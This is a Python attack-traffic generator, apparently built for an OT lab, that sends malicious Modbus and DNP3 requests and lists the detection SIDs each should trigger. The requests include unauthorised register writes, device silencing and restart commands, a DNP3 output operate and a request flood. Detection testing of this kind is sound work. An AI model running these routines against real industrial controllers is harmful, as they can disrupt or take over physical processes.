"""Lab attacker: generates malicious Modbus traffic for detection testing.

LAB USE ONLY. Every target is checked before anything is sent (labnet.check_target): it must be
in 10.10.1.0/24 and not the network, gateway or broadcast address; anything else is refused.

Scenarios and the LM SID each one should raise:
  scan           connect sweep of lab hosts on 502, then FC43 probes      -> 9100006, 9100004
  write          unauthorised FC6 + FC16 writes                          -> 9100001
  listen-only    FC8 sub 4 Force Listen Only Mode                        -> 9100002
  restart-comms  FC8 sub 1 Restart Communications                        -> 9100003
  flood          1000 FC3 reads in a burst over 4 connections             -> 9100007
  flood --count 3000                                                     -> 9100007, 9100008

DNP3 scenarios (default target: the outstation 10.10.1.11), sent from this non-master host:
  dnp3-cold-restart          FC13 Cold Restart                            -> 9100010
  dnp3-warm-restart          FC14 Warm Restart                            -> 9100011
  dnp3-direct-operate        FC5 Direct Operate, CROB on output 0         -> 9100012
  dnp3-write                 FC2 Write, g50v1 time and date               -> 9100013
  dnp3-disable-unsolicited   FC21 Disable Unsolicited, classes 1-3        -> 9100016
"""

import argparse
import socket
import time
from concurrent.futures import ThreadPoolExecutor

import dnp3
import labnet


def log(msg):
    print(f"attacker: {msg}", flush=True)


def scan(target, args):
    # 1. Connect sweep of the lab hosts on 502 (network, gateway and broadcast are skipped).
    hosts = labnet.lab_hosts()

    def probe(ip):
        try:
            labnet.connect(ip, 502, timeout=0.3).close()
            return ip
        except OSError:
            return None

    with ThreadPoolExecutor(max_workers=32) as pool:
        found = [ip for ip in pool.map(probe, hosts) if ip]
    log(f"sweep: port 502 open on {found}")

    # 2. Fingerprint the PLC: one new connection per unit ID, each asking FC43 Read Device Identification.
    for unit in range(1, args.count + 1):
        try:
            c = labnet.ModbusClient(target, unit=unit, timeout=1.0)
            reply = c.request(labnet.read_device_identification())
            c.close()
            if unit == 1:
                log(f"FC43 unit {unit}: {reply[:60]!r}")
        except (OSError, ConnectionError) as exc:
            log(f"FC43 unit {unit}: {exc}")
    log(f"sent FC43 to {args.count} unit IDs on {target}")


def write(target, args):
    c = labnet.ModbusClient(target)
    c.request(labnet.write_single_register(0, 9999))
    log("FC6 write HR0 = 9999")
    c.request(labnet.write_multiple_registers(10, [1, 2, 3, 4, 5]))
    log("FC16 write HR10-14")
    c.close()


def listen_only(target, args):
    c = labnet.ModbusClient(target, timeout=2.0)
    c.request(labnet.diagnostics(4), expect_reply=False)  # the device sends no reply
    log("FC8 sub 4 Force Listen Only Mode sent (a real device goes silent until restart-comms)")
    c.close()


def restart_comms(target, args):
    c = labnet.ModbusClient(target, timeout=2.0)
    try:
        c.request(labnet.diagnostics(1))
    except (socket.timeout, ConnectionError):
        pass
    log("FC8 sub 1 Restart Communications sent")
    c.close()


def flood(target, args):
    # Request flood: many reads on a few connections (few SYNs, so this is not a connection scan).
    per_conn = max(1, args.count // args.conns)

    def worker(_):
        done = 0
        try:
            c = labnet.ModbusClient(target, timeout=2.0)
            for _ in range(per_conn):
                c.request(labnet.read_holding(0, 10))
                done += 1
            c.close()
        except (OSError, ConnectionError) as exc:
            log(f"flood connection ended early: {exc}")
        return done

    with ThreadPoolExecutor(max_workers=args.conns) as pool:
        ok = sum(pool.map(worker, range(args.conns)))
    log(f"flood: {ok} of {per_conn * args.conns} requests answered over {args.conns} connections")


def dnp3_scenario(fc, objects, label):
    def run(target, args):
        session = dnp3.connect_master(target)
        try:
            iin1, iin2, _ = session.request(fc, objects)
            log(f"{label} sent to {target}: response IIN {iin1:02x} {iin2:02x}")
        finally:
            session.close()
    return run


SCENARIOS = {
    "scan": (scan, 25),
    "write": (write, 0),
    "listen-only": (listen_only, 0),
    "restart-comms": (restart_comms, 0),
    "flood": (flood, 1000),
    "dnp3-cold-restart": (dnp3_scenario(dnp3.COLD_RESTART, b"", "DNP3 cold restart"), 0),
    "dnp3-warm-restart": (dnp3_scenario(dnp3.WARM_RESTART, b"", "DNP3 warm restart"), 0),
    "dnp3-direct-operate": (dnp3_scenario(dnp3.DIRECT_OPERATE, dnp3.crob(0), "DNP3 direct operate (CROB, output 0)"), 0),
    "dnp3-write": (dnp3_scenario(dnp3.WRITE, dnp3.time_and_date(int(time.time() * 1000)), "DNP3 write (time and date)"), 0),
    "dnp3-disable-unsolicited": (dnp3_scenario(dnp3.DISABLE_UNSOLICITED, dnp3.EVENTS, "DNP3 disable unsolicited"), 0),
}


def main():
    p = argparse.ArgumentParser(description="OT lab attack traffic generator (lab network only)")
    p.add_argument("scenario", choices=sorted(SCENARIOS))
    p.add_argument("--target", default=None,
                   help="target (lab hosts in 10.10.1.0/24 only); default PLC 10.10.1.10, DNP3 outstation 10.10.1.11")
    p.add_argument("--count", type=int, default=None, help="probes (scan) or total requests (flood)")
    p.add_argument("--conns", type=int, default=4, help="connections used by flood")
    args = p.parse_args()

    if args.target is None:
        args.target = "10.10.1.11" if args.scenario.startswith("dnp3-") else "10.10.1.10"
    target = labnet.check_target(args.target)  # hard stop before any traffic
    func, default_count = SCENARIOS[args.scenario]
    if args.count is None:
        args.count = default_count
    log(f"scenario={args.scenario} target={target}")
    func(target, args)
    log("done")


if __name__ == "__main__":
    main()
